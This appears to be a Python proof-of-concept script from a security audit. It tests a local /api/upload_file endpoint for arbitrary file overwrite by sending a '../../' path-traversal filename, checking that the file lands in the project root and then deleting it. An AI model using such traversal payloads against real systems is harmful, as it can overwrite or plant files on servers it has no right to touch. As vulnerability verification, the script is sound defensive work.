import requests
import base64
import json

BASE_URL = "http://localhost:8000"

def test_upload_rce():
    print("Testing Arbitrary File Overwrite on /api/upload_file...")
    
    # We attempt to create a harmless file in the root
    # or overwrite a non-essential file.
    # To be safe in this audit, we'll try to create 'TEMPORARY_AUDIT_TEST.txt' in the project root.
    
    payload = {
        "kit": "neka_14135",
        "folder": "52-7", # Valid folder to pass the initial check
        "filename": "../../TEMPORARY_AUDIT_TEST.txt",
        "file_content": base64.b64encode(b"VULNERABILITY CONFIRMED: Arbitrary File Overwrite").decode('utf-8')
    }
    
    try:
        response = requests.post(f"{BASE_URL}/api/upload_file", json=payload)
        print(f"Status: {response.status_code}")
        data = response.json()
        if data.get("success"):
            print("SUCCESS: Request accepted.")
            # Verify if file exists in root
            import os
            if os.path.exists("TEMPORARY_AUDIT_TEST.txt"):
                print("VULNERABILITY CONFIRMED! File created in project root.")
                # Clean up
                os.remove("TEMPORARY_AUDIT_TEST.txt")
            else:
                print("File not found in expected location. Check path mapping.")
        else:
            print(f"Server rejected request: {data.get('message')}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    test_upload_rce()
